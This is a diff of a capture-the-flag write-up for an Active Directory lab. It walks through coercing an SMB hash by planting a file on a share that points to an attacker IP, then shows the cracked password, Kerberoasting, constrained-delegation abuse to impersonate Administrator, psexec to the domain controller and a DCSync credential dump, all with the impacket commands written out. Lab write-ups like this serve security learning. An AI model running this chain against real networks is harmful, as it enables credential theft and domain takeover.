@@ -33,16 +33,16 @@ now since i have write access, and the file share hints that svc.scanner service
 
 2. I tried to upload  @test.url file with this syntax:
 
-	`[InternetShortcut] 
-	URL=http://thm.loc 
-	WorkingDirectory=thm 
-	IconFile=\\YOURTUN0IP\icons\icon.ico        
-	IconIndex=1  `  
+	`[InternetShortcut]                                                                                                                                           
+	URL=http://thm.loc                                                                                                                                            
+	WorkingDirectory=thm                                                                                                                                          
+	IconFile=\\YOURTUN0IP\icons\icon.ico                                                                                                                          
+	IconIndex=1    `                                                                                                                                              
 
 but it didn't trigger authentication
 
-4. I tried another file type @test.ps1 with this syntax:   ~~the @ is to make the file at the top~~
-	`Test-Path \\192.168.157.253\icons\icon.ico`
+4. I tried another file type @test.ps1 with this syntax:   ~~the @ is to make the file at the top~~                                                              
+	`Test-Path \\192.168.157.253\icons\icon.ico`                                                                                                                  
 	and in just seconds I intercepted and received an SMB authentication request from svc.scanner account containing his NTLMv2 hash.
    <img width="945" height="277" alt="Pasted image 20260827171310" src="https://github.com/user-attachments/assets/86e241db-a377-46ec-b3cb-e3db8eb7dc64" />
 
@@ -55,7 +55,7 @@ the password is: 1summerlove!
 
 
 # Kerberoasting
-1. `impacket/GetUserSPNs.py ctf.local/svc.scanner -dc-ip 10.114.142.161 -request`
+1. `impacket/GetUserSPNs.py ctf.local/svc.scanner -dc-ip 10.114.142.161 -request`                                                                                 
 	I got the TGS-REP blob for svc.mssql
 
 	<img width="1912" height="802" alt="Pasted image 20260827195245" src="https://github.com/user-attachments/assets/9d5a5b25-0d61-48a6-a4e8-f86713d808d8" />
@@ -79,16 +79,16 @@ We found that svc.scanner has a constrained delegation relationship "AllowedToDe
 so we request a service ticket for CIFS as Administrator.                  CIFS is the service giving the DC file-system access
 
 
-1. Request a service ticket for CIFS impersonating Administrator                                                                                                  
+1. Request a service ticket for CIFS impersonating Administrator                                                                                                                                                                                                                  
    `impacket/getST.py ctf.local/svc.scanner -spn cifs/DC01.CTF.LOCAL -impersonate 'Administrator' -dc-ip <DC_IP>`                                                 
 	           -this will give us the TGS for CIFS stored in a .ccache file
    <img width="1247" height="222" alt="image" src="https://github.com/user-attachments/assets/a2496d9f-3d6d-4af1-89ea-1f9f71a9c815" />
 
 	
-3. we export the KRB5CCNAME to point to the .ccache file, in order to authenticate with this Kerberos ticket with subsequent tools
+3. we export the KRB5CCNAME to point to the .ccache file, in order to authenticate with this Kerberos ticket with subsequent tools                               
    `export KRB5CCNAME=<path_to_ccache_file>`
 		
-4. We used PsExec to authenticate to the DC as Administrator
+4. We used PsExec to authenticate to the DC as Administrator                                                                                                      
  `impcket/psexec.py ctf.local/Administrator@DC01.CTG.LOCAL -k -no-pass`
 -k: reads from the KRB5CCNAME environment variable
 we needed to specify the DC's hostname, because Kerberos relies on DNS hostname resolution
@@ -98,7 +98,7 @@ Now we navigate to the Administrator desktop and grab the flag
 
 
 # Going beyond the CTF
-we perform a DCSync Attack "dumping the DC's NTDS.dit database"
+we perform a DCSync Attack "dumping the DC's NTDS.dit database"                                                                                                   
    `impacket/secretsdump.py ctf.local/Administrator@DC01.CTF.LOCAL -k -no-pass -just-dc -output dc_dump`
 <img width="1150" height="747" alt="image" src="https://github.com/user-attachments/assets/5afd1cea-1dbb-4297-b60f-62fd80306851" />
    
